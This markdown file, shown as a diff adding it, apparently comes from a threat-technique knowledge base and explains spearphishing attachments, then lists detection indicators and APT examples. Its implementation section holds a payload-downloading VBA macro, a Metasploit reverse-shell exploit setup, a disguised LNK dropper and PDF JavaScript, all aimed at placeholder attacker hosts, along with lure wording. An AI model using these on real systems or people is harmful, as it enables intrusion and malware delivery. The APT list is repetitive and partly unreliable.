@@ -1,0 +1,605 @@
+# Spearphishing Attachment
+
+_The use of spearphishing attachments for initial access involves attackers sending malicious files to specific individuals, aiming to deceive them into opening the file and unknowingly allowing the attacker to gain access to their system._
+
+## Origin of the Technique
+
+`Spearphishing Attachment` is one of the most prevalent initial access technique used by threat actors. This technique developed as attackers recognized the effectiveness of highly targeted social engineering combined with malicious attachments. The approach gained prominence in the early 2000s as email became an essential business communication tool.
+
+## How to Implement the Technique
+
+A successful spearphishing attachment attack requires careful preparation and execution. The initial phase involves **reconnaissance** to gather information about targets, including their job roles, interests, communication patterns, and organizational structure. This information forms the foundation for crafting convincing lures that will resonate with specific recipients. Attackers typically use public sources like LinkedIn, company websites, and social media to build detailed profiles of potential victims and their organizations.
+
+Delivery of spearphishing attachments requires infrastructure that appears legitimate to both recipients and security tools. Attackers often compromise legitimate email accounts or create lookalike domains for sending emails. They carefully craft email content to align with the target's expectations and include urgency triggers to prompt immediate action. Email headers and metadata are often manipulated to bypass security filters and appear authentic.
+
+**Macro-based Spearphishing**
+
+Macro-based spearphishing embeds malicious Visual Basic for Applications (VBA) code within Microsoft Office documents such as Word (.docx), Excel (.xlsx), or PowerPoint (.pptx) files.&#x20;
+
+To create a malicious macro-enabled document, attackers first develop the VBA code that will execute when triggered. _The macro typically contains a downloader function to retrieve the actual malware payload from a remote server._ This technique maintains a small document footprint while enabling the delivery of more sophisticated malware. A basic example of such a macro might look like this:
+
+<pre class="language-batch"><code class="lang-batch"><strong># Execute when document is opened
+</strong>Sub AutoOpen()
+    ExecuteMaliciousPayload
+End Sub
+
+<strong># Alternative trigger for Word documents
+</strong>Sub Document_Open()
+    ExecuteMaliciousPayload
+End Sub
+
+<strong># Trigger for Excel workbooks
+</strong>Sub Workbook_Open()
+    ExecuteMaliciousPayload
+End Sub
+Sub ExecuteMaliciousPayload()
+    Dim wsh As Object
+    Set wsh = CreateObject("WScript.Shell")
+    
+<strong># Download and execute payload using PowerShell
+</strong>    Dim command As String
+    command = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command 
+    ""$c = New-Object System.Net.WebClient; $c.DownloadFile
+    ('https://compromised-site.com/invoice.dat', '$env:TEMP\svchost.exe'); 
+    Start-Process '$env:TEMP\svchost.exe'"""
+    wsh.Run command, 0, False
+    Set wsh = Nothing
+End Sub
+</code></pre>
+
+_The attacker must then social engineer the victim into enabling macros, as most modern Office installations disable them by default._ This typically involves crafting persuasive messages within the document claiming that content is protected or that macros must be enabled to view the document properly. Common lures include statements like "This document is protected. Please click 'Enable Content' to view" or "This document was created in a newer version of Office. Enable macros to correctly display content." To maximize success rates, attackers design documents with official-looking headers, logos, and formatting that matches legitimate corporate communications.
+
+**Exploit-based Spearphishing**&#x20;
+
+_Exploit-based spearphishing leverages vulnerabilities in document processing applications to execute code without requiring user interaction beyond opening the file._ Unlike macro-based attacks, these don't prompt for macro permissions, making them particularly effective against security-conscious users.
+
+A common approach targets vulnerabilities in Microsoft Office's Equation Editor, RTF parser, or PDF interpreters. For example, to exploit CVE-2017-11882 (a Microsoft Equation Editor vulnerability), attackers create a specially crafted RTF file that contains a malformed equation object. When the victim opens this document, the vulnerability allows for arbitrary code execution without any additional permissions. To create such an exploit, attackers might use frameworks like Metasploit or specialized tools:
+
+<pre class="language-bash"><code class="lang-bash"><strong># Using Metasploit to generate an exploit for CVE-2017-11882
+</strong>use exploit/windows/fileformat/office_ms17_11882
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST attacker-controlled-server.com
+set LPORT 443
+<strong># The exploit is saved to ~/.msf4/local/QuarterlyReport.rtf
+</strong>set FILENAME QuarterlyReport.rtf
+exploit
+</code></pre>
+
+For more sophisticated attacks, adversaries develop custom exploits targeting zero-day vulnerabilities. These exploits are typically packaged within benign-looking documents and delivered to specific high-value targets.&#x20;
+
+When developing exploit-based documents, attackers often implement decoy content that displays when the document is opened, hiding the exploit execution from the user. This might include legitimate business content copied from public sources or previously stolen documents to maintain authenticity and reduce suspicion.
+
+**Executable-based Spearphishing**
+
+Executable-based spearphishing delivers actual executable files disguised as legitimate documents or applications. This approach requires more significant user interaction, as the victim must execute the attachment, but it provides attackers with greater flexibility in payload delivery.
+
+_A common technique involves disguising executables (`.exe`, `.scr`) as document files by manipulating icons and file extensions._ Attackers often use container formats like ZIP, RAR, or ISO to bypass email security filters that block executable attachments. Modern techniques include using Windows shortcuts (`.lnk` files) within these archives to execute PowerShell or cmd.exe with malicious arguments. To create a convincing executable disguised as a document, attackers might use the following approach:
+
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong># Download and execute the malicious payload, then open a decoy document
+</strong>$maliciousScript = @'
+Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-ExecutionPolicy Bypass -Command `"&#x26; {
+    Invoke-WebRequest -Uri 'https://malicious-server.com/payload.exe' -OutFile '$env:TEMP\update.exe'
+    Start-Process '$env:TEMP\update.exe'
+
+    Invoke-WebRequest -Uri 'https://malicious-server.com/decoy.pdf' -OutFile '$env:TEMP\document.pdf'
+    Start-Process '$env:TEMP\document.pdf'
+}`""
+'@
+
+<strong># Save malicious script
+</strong>$scriptPath = "$env:TEMP\installer.ps1"
+Set-Content -Path $scriptPath -Value $maliciousScript
+
+<strong># Create a shortcut (.LNK file) that executes the PowerShell script
+</strong>$shell = New-Object -ComObject WScript.Shell
+$shortcut = $shell.CreateShortcut("$env:TEMP\Financial_Report.lnk")
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
+$shortcut.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE, 0" 
+
+<strong># Use Word icon for deception
+</strong>$shortcut.Save()
+
+<strong># Package into ISO file using third-party tools like mkisofs
+</strong>mkisofs -o Financial_Report.iso Financial_Report.lnk
+</code></pre>
+
+**Link-based Spearphishing**
+
+Link-based spearphishing embeds malicious URLs within document attachments rather than embedding the malicious code directly. This approach helps bypass security controls that scan attachments for malicious code, as the documents themselves don't contain exploits or macros.
+
+_A common implementation involves embedding URLs in PDF documents that, when clicked, direct users to credential harvesting sites or drive-by download pages._ Creating such a malicious PDF can be accomplished using tools like Adobe Acrobat or specialized frameworks:
+
+<pre class="language-javascript" data-overflow="wrap"><code class="lang-javascript"><strong>// JavaScript to be embedded in a PDF document using Adobe Acrobat's JavaScript console. This creates a PDF that automatically attempts to load a URL when opened
+</strong>
+this.submitForm({
+    cURL: "https://malicious-site.com/exploit",
+    cSubmitAs: "PDF"
+});
+</code></pre>
+
+Alternatively,  a PDF with clickable links can be created using standard tools and social engineering content like "Click here for important information". Adversaries might also embed links in Office documents that, when clicked, trigger the download of malware. The document might contain instructions that guide the user through the process of downloading and executing the malicious content, often under the guise of accessing protected information or required software.
+
+## **Requirements**
+
+**User Interaction** is absolutely essential for spearphishing attachment attacks to succeed, as the entire technique revolves around deceiving targets into opening malicious email attachments. The attack requires recipients to actively open the attached file and may require additional actions such as enabling macros, clicking embedded links, or executing disguised files. _Without this crucial user engagement, the attack vector would completely fail regardless of how sophisticated the malicious payload might be._&#x20;
+
+**Network Connectivity** is required at multiple stages of the spearphishing attachment attack chain. Initially, connectivity is needed for the delivery of the phishing email containing the malicious attachment to the target. _Many variants rely on network access to download additional payloads from command and control servers after the initial attachment is opened_. The attack infrastructure itself requires network connectivity to manage command and control communications once initial access is established.
+
+**File System Write** capability is critical for the success of most spearphishing attachment technique implementations. _The attack typically involves writing files to the victim's system, by either saving the attachment or through secondary stages where payloads are downloaded and executed._ Without file system write access, the malware couldn't establish  persistence or execute many of the attack functions.
+
+**Registry Write:** While the malware payloads delivered through attachments frequently attempt to write to the registry almost immediately after execution (e.g., to establish persistence, store configuration data, or disable security features), the success of the technique—getting code to run as a result of the user opening or interacting with the attachment—usually does not depend on the ability to write to the registry. Therefore, the initial access achieved via the spearphishing attachment can often occur even if the compromised user has limited or restricted registry write permissions.
+
+**Privilege Level**: Spearphishing attachment techniques typically begin execution with user-level privileges - specifically the privileges of the email recipient who opens the attachment. _This user-level access is sufficient for the initial compromise and execution of malicious code_, as most users have adequate permissions to open documents and execute the types of commands embedded in malicious macros or scripts.&#x20;
+
+**Software Dependencies** are significant requirements for successful spearphishing attachment techniques. _The attack variants specifically rely on the presence of applications like Microsoft Office for macro-based attacks, PDF readers for PDF-based attacks, and various document processing applications for exploit-based approaches_. The technique also commonly relies on scripting engines like PowerShell and VBA to execute malicious code after the initial deception succeeds.
+
+**Environment Configurations** significantly impact the success of spearphishing attachment attacks. _For macro-based attacks to work, Office security settings must allow macro execution (even if requiring user confirmation)_. Windows configuration settings like hidden file extensions facilitate deception in executable-based attacks. Email security settings, attachment handling policies, and application execution controls all represent environmental configurations that attackers must consider and attempt to bypass for their campaigns to succeed.
+
+**Delivery Mechanism**: The technique requires sophisticated methods for spoofing sender addresses and bypassing security filters. Additional delivery mechanisms come into play in multi-stage attacks, where initial attachments contain downloaders that retrieve the actual malware payload from attacker-controlled servers. _The effectiveness of the attack heavily depends on the ability to deliver both the initial phishing email and any subsequent payloads without detection._
+
+**Target Deception** forms the core of spearphishing attachment techniques, relying on sophisticated _social engineering to convince users that the emails and attachments are legitimate._ Specific deceptive prompts like "This document is protected. Please click 'Enable Content' to view" demonstrate how attackers manipulate victims into taking security-compromising actions while believing they are performing normal business activities.
+
+**Exploitable Conditions** must exist for spearphishing attachment attacks to succeed. _These include technical vulnerabilities in document processing applications and human vulnerabilities such as users' tendency to trust official-looking communications_, especially when they appear to come from known sources or contain contextually relevant information. The technique exploits both software weaknesses and psychological factors that can be manipulated through social engineering, creating multiple exploitable conditions that attackers leverage for initial access.
+
+## **Resulting Properties**
+
+
+**Execution Type:** This technique employs multiple execution types depending on the specific implementation. Macro-based attachments use Scripts (VBA code) embedded within Office documents that typically create `WScript.Shell` objects or execute PowerShell commands. Exploit-based attachments may lead to Command execution through vulnerability exploitation. Executable files are delivered directly in executable-based spearphishing, often disguised with document icons and extensions. Many implementations use Executable with arguments, particularly when PowerShell or cmd.exe is launched with specific command-line parameters to download and execute additional payloads.
+
+**Process Lineage:** The process lineage varies by implementation but follows predictable patterns. For macro-based attacks, the lineage typically begins with Microsoft Office applications which spawn `WScript.Shell` or PowerShell processes that subsequently download and execute the actual malware payload. Exploit-based attachments similarly use Office applications or PDF readers as the parent process. Executable-based attachments may create more direct lineage paths. Link-based methods may incorporate browser processes in the lineage chain between document applications and eventual payload execution.&#x20;
+
+## Detection Indicators
+
+**Suspicious File Access**
+\
+Creation of executable files (`.exe`, `.scr`, `.ps1`), script files (`.vbs`, `.js`), or container files (`.iso`) in user directories like `%TEMP%`, `%APPDATA%`, or Downloads, especially originating from Office applications or email clients. Unexpected file writes by Office applications, such as dropping executables or scripts. Access to or creation of LNK files designed to execute scripts or binaries, often found within archives (`.zip`, `.rar`) or ISO images attached to emails. The presence of files with misleading double extensions (e.g., `report.pdf.exe`) or icons mimicking legitimate documents being written or executed.&#x20;
+
+**Suspicious Process Access**
+\
+Microsoft Office application processes (e.g., `WINWORD.EXE`, `EXCEL.EXE`, `POWERPNT.EXE`, `OUTLOOK.EXE`) spawning child processes typically used for scripting or command execution, such as `cmd.exe`, `powershell.exe`, `wscript.exe`, or `cscript.exe`. Execution of processes directly from files extracted from archives originating from email attachments (e.g., `explorer.exe` launching an `.exe` or `.lnk` from a temporary path after archive extraction). Scripting engines (`powershell.exe`, `wscript.exe`) initiating network connections or launching further unexpected processes (e.g., downloaded executables like `svchost.exe` or `update.exe` ). PDF reader processes (`AcroRd32.exe`, `Acrobat.exe`) spawning unexpected processes or making outbound network connections triggered by embedded scripts or links.
+
+**Suspicious Network Activity**
+\
+Network connections initiated directly from Microsoft Office applications, PDF readers, or spawned scripting engines (`powershell.exe`, `wscript.exe`) to external IP addresses or domains, especially those known to be malicious, recently registered, or hosting unexpected file types (`.dat`, `.exe`). Use of standard web protocols (HTTP/S) by unusual processes to download executable files, scripts, or subsequent malware stages (e.g., `$c.DownloadFile`, `Invoke-WebRequest`). Outbound connections associated with exploit frameworks (like Metasploit reverse shells) originating from document-handling applications. Network traffic related to PDF submissions (`this.submitForm`) attempting to exfiltrate data or contact malicious URLs.&#x20;
+
+**Suspicious Commandline Arguments**
+\
+Execution of `powershell.exe` with arguments indicative of bypassing security controls or hiding activity, such as `-NoP` (NoProfile), `-NonI` (NonInteractive), `-W Hidden` (WindowStyle Hidden), `-Exec Bypass` (ExecutionPolicy Bypass), or `-EncodedCommand`. Use of `cmd.exe /c` or `cmd.exe /k` followed by commands to download or execute files, often involving scripting languages or utilities like `certutil.exe` or `bitsadmin.exe`. Launching `wscript.exe` or `cscript.exe` to run script files located in temporary directories or embedded within commands. Arguments within LNK shortcuts pointing `powershell.exe` or `cmd.exe` to execute scripts or commands using parameters like `-File` or containing inline scripts.
+
+**Key Interfaces and Methods**
+\
+Monitoring for the invocation of specific VBA methods commonly used in malicious macros, such as `AutoOpen()`, `Document_Open()`, `Workbook_Open()`, `CreateObject("WScript.Shell")`, and `.Run` method calls within Office applications. Usage of PowerShell cmdlets associated with downloading (`Invoke-WebRequest`, `System.Net.WebClient.DownloadFile`) and execution (`Start-Process`, `Invoke-Expression`, `Invoke-Command`). Use of COM objects like `WScript.Shell` instantiated via `New-Object -ComObject` in PowerShell or `CreateObject` in VBA to execute commands. PDF JavaScript execution involving methods like `this.submitForm` or `app.launchURL` to initiate network connections or launch external content.
+
+**Suspicious Email Headers**
+
+Indicators in suspicious email headers include inconsistencies in `From:` and `Reply-To:` addresses, especially if the `From:` address is spoofed to appear as an internal sender. Look for mismatches between the sender's display name and the actual email address. Examine the `Received:` headers for anomalies indicating email relaying through unusual or compromised servers. Check for missing or malformed headers, or the presence of forged headers designed to bypass spam filters. Pay attention to `Message-ID` and `Date:` headers for inconsistencies or manipulation, and look for unusual encoding or character sets used in headers.
+
+**Suspicious Email Source**
+
+Indicators of a suspicious email source include emails originating from newly registered domains, especially if the domain registration date is very recent and the email content is business-related. Emails sent from free email providers (e.g., Gmail, Yahoo, Outlook.com) for purported business communications, particularly when claiming to be from large organizations, are suspicious. Check the sender's domain reputation using online reputation services; domains with poor or no reputation, or those associated with known spam or phishing campaigns, are red flags. Emails originating from domains that are visually similar to legitimate domains but with slight variations (typosquatting domains) should also be considered suspicious.
+
+**Suspicious Attachment Metadata**
+
+Specific indicators in suspicious attachment metadata include mismatched file creation timestamps, where the creation date is significantly older or newer than expected based on the email context. Look for embedded URLs within document properties (e.g., document title, author, comments) that are different from the sender's domain or known legitimate URLs. Unexpected or generic author information or company names in document properties, especially if they don't align with the claimed sender, can be indicative. For executable attachments disguised as documents, metadata might reveal the actual file type or origin incongruent with the displayed file name.
+
+## APT Procedures
+
+**Macro-based Attachment**
+
+Macro-based attacks commonly leverage the functionality of document formats like Microsoft Office files to deliver malware. These attacks hinge on social engineering to persuade users to open seemingly benign document attachments delivered via email. Once opened, these documents prompt users to enable macros, often deceptively presented as necessary to view the document's content properly. Upon enabling macros, embedded malicious code, typically VBA scripts, executes. This macro execution then serves as the initial foothold, often downloading and installing further malware payloads such as backdoors, trojans, or RATs onto the victim's system.
+
+* **admin@338** attacks used  macro-laden Microsoft Office documents, enticing victims with seemingly innocuous attachments. Upon opening, recipients were socially engineered to enable macros, unknowingly initiating VBA code execution that led to the download of a backdoor for persistent espionage.
+* **Ajax Security Team** (Rocket Kitten) employed personalized emails with custom Microsoft Office attachments, simulating trusted communications to increase victim engagement. Recipients, upon opening these documents and enabling macros, were compromised with keyloggers and credential stealers, and further subjected to credential phishing through fake login pages.
+* **Andariel** campaigns featured weaponized Microsoft Word or Excel documents, delivered via emails that appeared to originate from trusted sources. Macro activation in these documents triggered embedded VBA code, which then proceeded to download and deploy the Rifdoor backdoor onto targeted systems.
+* **APT12** (IXESHE) campaigns distributed malicious Microsoft Office documents and PDFs, conveyed through legitimate-looking emails to enhance credibility. Opening these attachments and enabling macros in Office documents exploited CVE-2012-0158, facilitating the deployment of backdoors like RIPTIDE or WATERSPOUT for unauthorized network access.
+* **APT19** campaigns leveraged XLSM attachments, cleverly disguised as urgent business documents to prompt user interaction. Enabling macros within these XLSM files initiated a macro that directly downloaded and executed Cobalt Strike BEACON, a tool favored for command and control.
+* **APT28** (Sofacy/Fancy Bear) attacks used emails spoofing legitimate organizations, incorporating subjects like “Upcoming Defense events February 2018” and attaching Microsoft Office documents and RAR archives. While RAR archives contained executables, Office documents, especially Excel files, relied on tricking users into enabling macros to deploy loader Trojans and backdoors.
+* **APT30** emails contained weaponized DOC attachments, artfully disguised as sensitive political or military reports to pique victims' interest. Opening these attachments and enabling macros in weaponized DOC files triggered embedded scripts, leading to the deployment of malware droppers such as MILKMAID.
+* **APT38** utilized job application lures with macro-enabled Microsoft Office document attachments, exploiting the common practice of sending resumes and job-related documents via email. Macro activation in these documents executed malware payloads, specifically deploying RATs like CROWDEDFLOUNDER for remote access and control.
+* **APT39** (Chafer) campaigns used Excel attachments in business-themed emails, mimicking legitimate business correspondence to encourage user interaction. Enabling macros in these files executed embedded VBScripts, which in turn downloaded further malicious payloads to compromise targeted organizations.
+* **Bandook** RAT was delivered via emails with ZIP archives containing macro-enabled Microsoft Word documents, skillfully disguised as shipment manifests to lure victims from logistics sectors. Macro enablement within these documents triggered external template injection, leading to Bandook RAT download and execution for remote access.
+* **BlackTech** group emails used password-protected ZIP or RAR archives, carefully mimicking trusted business partners to appear as routine business communications. Recipients, upon opening these archives and enabling macros in the malicious Excel macro-enabled file (XLSM) inside, inadvertently executed Flagpro malware.
+* **BRONZE BUTLER** (TICK) utilized hijacked email accounts to send Microsoft Word attachments, cleverly themed around salary increases to entice employees. Macro enablement in these documents triggered Equation Editor exploits, resulting in the deployment of downloaders like ABK or BBK malware for persistent access.
+* **Cobalt Group** campaigns employed legitimate-looking emails mimicking financial regulators, strategically designed to target individuals in the financial sector. Macro enablement within the weaponized Microsoft Office documents attached to these emails allowed attackers to deploy the Beacon Trojan, establishing a foothold for financial theft.
+* **C0015** campaign emails aimed at users likely to open password-protected ZIP archives and then enable macros in Word documents inside, indicating a multi-layered approach to targeting specific user behaviors. Opening password-protected ZIP archives, then Word documents and enabling macros triggered VBA code execution, leading to BazarLoader deployment as a multi-stage process.
+* **DanBot** malware deployment via emails with weaponized Excel attachments targeted users likely to open business spreadsheets, exploiting common workplace habits. Enabling macros in these spreadsheets triggered the DanDrop macro and DanBot payload deployment, crucial for payload delivery to business professionals.
+* **DarkTortilla** malware distribution through documents targeted users likely to open logistics or business-related attachments, leveraging industry-specific lures. User action to enable macros in Office documents was necessary to initiate loader execution, relying on social engineering to prompt macro enablement.
+* **Ferocious Kitten** with malicious documents required users to enable macros, utilizing politically charged lures like “Romantic Solidarity With Lovers of Freedom2.doc” to resonate with targets. Emails used politically charged lures to entice targets to open attachments and enable macros, leveraging themes of freedom and solidarity.
+* **FIN6** attacks involved attachments requiring macro enablement in Office documents disguised as business communications targeting eCommerce merchants, demonstrating industry-specific targeting. Lures relevant to the eCommerce sector encouraged users to open attachments and enable macros, exploiting industry-specific knowledge for higher engagement.
+* **FIN7** attacks with malicious Microsoft Documents employed diverse interaction requirements, including Excel/Macro vectors requiring macro enablement alongside LNK/VBScript vectors. Excel/Macro vectors demanded user action to enable macros, while LNK/VBScript vectors required users to double-click an image within the document.
+* **FIN8** campaigns leveraged Word documents prompting macro enablement, targeting the retail and hospitality sectors with tailored lures. Emails tailored for retail and hospitality used industry-specific lures to encourage users to open attachments and enable macros, exploiting sector-specific knowledge.
+* **Flagpro** delivery involved email attachments requiring users to open password-protected archives, then XLSM documents, and enable macros, showcasing a layered approach to user interaction dependency. This multi-step process heavily relied on user actions at each stage to initiate the Flagpro infection chain.
+* **C0015** campaign utilized weaponized attachments requiring users to open ZIP archives, then Word documents, and enable macros for BazarLoader infection. This multi-step process depended on user interaction at each stage to initiate the BazarLoader infection, highlighting layered user-interaction dependency for malware delivery.
+* **Hancitor** delivery employed attachments prompting macro enablement in Word documents, often using business lures like invoices. Emails often used business lures like invoices to trick recipients into enabling macros, a necessary user action for malware deployment and initial access.
+* **IcedID** delivery involved attachments requiring macro enablement in Word documents, employing social engineering tactics. Emails often used social engineering to convince users to enable macros, a necessary user action for malware deployment, highlighting social engineering effectiveness.
+* **JSS Loader** delivery used emails with malicious Excel attachments requiring macro enablement for malware deployment, leveraging user's familiarity with spreadsheets. Macro enablement was a necessary user action for malware deployment, relying on user's habit of enabling macros in spreadsheets for business tasks.
+* **Kerrdown** delivery via email attachments required users to enable macros (for .doc) or execute the attachment (.exe), providing attackers with flexible options for user-initiated infection. Both options required user actions to initiate infection, offering flexibility in user interaction requirements for malware delivery, broadening attack surface.
+* **Kimsuky** attacks utilized Word, Excel, and HWP documents prompting macro enablement, highlighting the group's broad document-based attack capabilities. Macro enablement was a necessary user action for malware deployment, highlighting reliance on user behavior for successful compromise via macro-enabled documents across various formats.
+* **KONNI** delivery employed emails with malicious Word document attachments requiring macro enablement, utilizing social engineering to encourage user interaction with malicious documents. Macro enablement was a necessary user action for malware deployment, showcasing social engineering to encourage macro enablement in documents for initial access.
+* **Lazarus Group**'s Operation Dream Job campaign delivered malicious Microsoft Word documents requiring macro enablement, focusing on job-themed lures. Macro enablement was necessary for malware deployment, highlighting reliance on social engineering within job offer-themed lures for macro activation, exploiting job seekers' trust.
+* **LazyScripter** delivery involved emails with document files, requiring users to open the files and potentially execute embedded content, suggesting a combination of automatic and user-initiated actions. Some level of user interaction beyond simply opening the file was implied, suggesting a blend of automatic and user-initiated actions for infection, indicating flexible attack vectors.
+* **Lokibot** delivery used emails with malicious XLS attachments requiring macro enablement, targeting users accustomed to handling spreadsheets. Macro enablement was a necessary user action for malware deployment, emphasizing reliance on user behavior for successful Lokibot infection via macro-enabled spreadsheets, targeting business users.
+* **menuPass** delivery involved emails with Office documents requiring macro enablement, showcasing social engineering tactics to encourage user interaction. Macro enablement was a necessary user action for malware deployment, showcasing social engineering to encourage macro enablement in Office documents for initial access and payload execution.
+* **Mofang** delivery used emails with malicious documents requiring macro enablement (assumed for Office documents), suggesting a reliance on user interaction for successful exploitation. Macro enablement was implied as necessary for malware execution, placing reliance on user interaction for compromise via document macros, a common tactic for this APT.
+* **Molerats** delivery employed emails with malicious Microsoft Word attachments requiring macro enablement, highlighting the persistent use of macro-based attacks by this group. Macro enablement was a necessary user action for malware deployment, highlighting reliance on user behavior for successful Molerats infection via macro-enabled documents, a consistent approach.
+* **MuddyWater** delivery involved emails with targeted attachments requiring macro enablement (assumed for Office documents), indicating a standard tactic for this APT. Macro enablement was implied as necessary for malware execution, placing reliance on user interaction for compromise via document macros, a typical technique used by MuddyWater.
+* **Nomadic Octopus** delivery used emails with malicious attachments requiring macro enablement (assumed for Office documents), suggesting a common APT technique. Macro enablement was implied as necessary for malware execution, placing reliance on user interaction for compromise via document macros, a frequently employed method by APTs.
+* **OceanSalt** delivery employed emails with Microsoft Office attachments requiring macro enablement, highlighting the group's reliance on user-initiated macro execution. Macro enablement was a necessary user action for malware deployment, emphasizing reliance on user behavior for successful OceanSalt infection via macro-enabled documents, a common tactic.
+* **Octopus** delivery used emails requiring macro enablement (assumed for Office documents), relying on user interaction for successful compromise. Macro enablement was implied as necessary for malware execution, placing reliance on user interaction for successful compromise through document macros in emails, a standard user-dependent vector.
+* **OilRig** delivery involved emails with malicious attachments requiring macro enablement (assumed for Office documents), highlighting the group's use of macro-based infection vectors. Macro enablement was implied as necessary for malware execution, placing reliance on user interaction for successful compromise through document macros, a typical method for initial access.
+* **PoetRAT** delivery employed emails with malicious Word documents requiring macro enablement, highlighting the continued effectiveness of macro-based attacks. Macro enablement was a necessary user action for malware deployment, highlighting reliance on user behavior for successful PoetRAT infection via macro-enabled documents, a common and effective technique.
+* **QakBot** delivery via attachments required users to enable content (macros) in Excel, emphasizing user action as a critical step in the infection chain. Macro enablement in Excel was a necessary user action for malware deployment, emphasizing reliance on user behavior for QakBot infection via macro-enabled spreadsheets, a common delivery method for this malware.
+* **Rancor** delivery involved emails with malicious documents requiring macro enablement (assumed for Office documents), indicating a typical tactic for this APT. Macro enablement was implied as necessary for malware execution, placing reliance on user interaction for compromise via document macros, a standard technique for initial compromise.
+* **RedCurl** delivery employed emails with malicious files requiring macro enablement (assumed for Office documents), showcasing the persistent use of macro-based attacks. Macro enablement was implied as necessary for malware execution, placing reliance on user interaction for successful compromise through document macros, highlighting a common APT technique.
+* **REvil** delivery used emails with MS Word Documents requiring macro enablement, emphasizing user behavior as a key element in the infection process. Macro enablement was a necessary user action for malware deployment, emphasizing reliance on user behavior for successful REvil infection via macro-enabled documents, a common ransomware delivery method.
+* **Rifdoor** delivery involved emails with malicious Excel or Word documents requiring macro enablement, highlighting the versatility of macro-based attacks across Office formats. Macro enablement was a necessary user action for malware deployment, highlighting reliance on user behavior for Rifdoor infection using macro-enabled office files, a common APT tactic.
+* **Saint Bear** delivery employed emails with Microsoft Office documents requiring macro enablement (assumed), indicating a standard APT technique. Macro enablement was implied as necessary for malware execution, placing reliance on user interaction for successful compromise through document macros, a frequently used method.
+* **Sandworm Team** delivery used emails with malicious Microsoft Office attachments requiring macro enablement, highlighting the group's use of macro-based infection vectors. Macro enablement was a necessary user action for malware deployment, highlighting reliance on user behavior for Sandworm Team infection via macro-enabled documents, a key component of their attack strategy.
+* **Squirrelwaffle** delivery involved emails with Microsoft Office documents requiring users to open ZIP archives, open Office documents, and enable content (macros), demonstrating a multi-step infection process. This multi-step process heavily relied on user actions at each stage of the infection chain for malware delivery, increasing the complexity of the attack chain.
+* **SVCReady** delivery via emails with malicious Microsoft Word documents automatically executed upon opening the document due to AutoOpen macros, bypassing the need for explicit user macro enablement. No user action beyond opening the document was needed; AutoOpen macro ensured automatic execution upon document opening for infection, making it a streamlined process.
+* **TA2541** delivery used emails with MS Word documents requiring macro enablement (assumed), suggesting a standard APT tactic. Macro enablement was implied as necessary for malware execution, placing reliance on user interaction for successful compromise through document macros, a common technique in APT campaigns.
+* **TA505** delivery via attachments required users to enable macros in Excel spreadsheets, emphasizing user action as a critical step in their attack methodology. Macro enablement in Excel was a necessary user action for malware deployment, emphasizing reliance on user behavior for successful TA505 infection via macro-enabled spreadsheets, a favored method for this group.
+* **ThreatNeedle** delivery used emails with malicious Word documents requiring macro enablement, highlighting the group's reliance on macro-based infection vectors. Macro enablement was a necessary user action for malware deployment, highlighting reliance on user behavior for ThreatNeedle infection through macro-enabled documents, a targeted and effective technique.
+* **TrickBot** delivery employed emails with Excel sheets requiring users to enable content (macros), emphasizing user interaction as a necessary step for infection. Macro enablement in Excel was a necessary user action for malware deployment, emphasizing reliance on user behavior for TrickBot infection via macro-enabled spreadsheets, a common distribution method.
+* **WarzoneRAT** delivery used emails with Word documents requiring macro enablement, highlighting the continued effectiveness of macro-based attacks. Macro enablement was a necessary user action for malware deployment, highlighting reliance on user behavior for WarzoneRAT infection via macro-enabled documents, an effective initial access method.
+* **WIRTE** delivery involved emails with MS Word and Excel attachments requiring macro enablement, showcasing the versatility of macro-based attacks across Office applications. Macro enablement was a necessary user action for malware deployment, emphasizing reliance on user behavior for WIRTE infection via macro-enabled Office files, a common and adaptable technique.
+* **Wizard Spider** delivery employed emails with Microsoft documents requiring macro enablement, highlighting the group's reliance on user-initiated macro execution for infection. Macro enablement was a necessary user action for malware deployment, emphasizing reliance on user behavior for Wizard Spider infection via macro-enabled documents, a significant attack vector for this group.
+
+**Exploit-based Attachment**
+
+Exploit-based attacks represent a more technically sophisticated approach, relying on vulnerabilities within software to execute malicious code automatically upon opening a crafted attachment. These attacks often use weaponized document formats like RTF, Office documents, or archives, engineered to trigger specific exploits when processed by vulnerable applications. Unlike macro-based attacks, exploit-based methods frequently require minimal to no user interaction beyond simply opening the malicious attachment. Exploits target weaknesses like buffer overflows, template injection vulnerabilities, or specific CVEs in software like Microsoft Office, WinRAR, or Hangul Word Processor.&#x20;
+
+* **APT19** campaigns distributed Rich Text Format (RTF) attachments, weaponized to automatically trigger CVE-2017-0199 exploit upon opening, enabling arbitrary code execution and payload deployment. This exploit facilitated arbitrary code execution, establishing a foothold for payload delivery without requiring further user interaction beyond opening the document.
+* **APT28** (Sofacy/Fancy Bear) attacks used RAR archive attachments, engineered to automatically exploit vulnerabilities upon opening, though the specific exploit is unspecified in reports. Opening these archives triggered an exploit within the archive handling process, leading to payload deployment and initial access, requiring minimal user interaction.
+* **APT29** campaigns used HTML attachments with embedded JavaScript, designed for ISO-based exploit delivery mechanisms, demonstrating a multi-stage exploit approach. Opening these HTML attachments in a browser automatically executed JavaScript, decoding and embedding a malicious ISO file, initiating a complex exploit sequence.
+* **APT37** (Reaper) campaigns employed HWP attachments that automatically triggered CVE-2018-0802 upon opening, showcasing the exploitation of HWP vulnerabilities. Opening HWP files automatically triggered the CVE-2018-0802 exploit, leading to shellcode execution and DOGCALL backdoor malware deployment without user interaction beyond file opening.
+* **BADFLICK** malware was delivered via emails with weaponized RTF documents, exploiting a buffer overflow in EQNEDIT32.EXE upon opening, targeting military sectors. Opening these RTF documents automatically triggered an exploit, leading to BADFLICK payload deployment without macro enablement or further user interaction.
+* **BITTER** APT campaigns distributed weaponized RTF documents and Excel spreadsheets, frequently spoofing government entities to enhance credibility. Opening Excel or RTF files automatically triggered Equation Editor exploits, leading to remote code execution and deployment of the “ZxxZ” trojan without user interaction beyond file opening.
+* **BLINDINGCAN** RAT was delivered through weaponized .docx attachments, exploiting CVE-2017-0199 via template injection upon opening, mimicking defense contractors. Opening these .docx files automatically triggered exploits, facilitating RAT installation without macro enablement or further user interaction required.
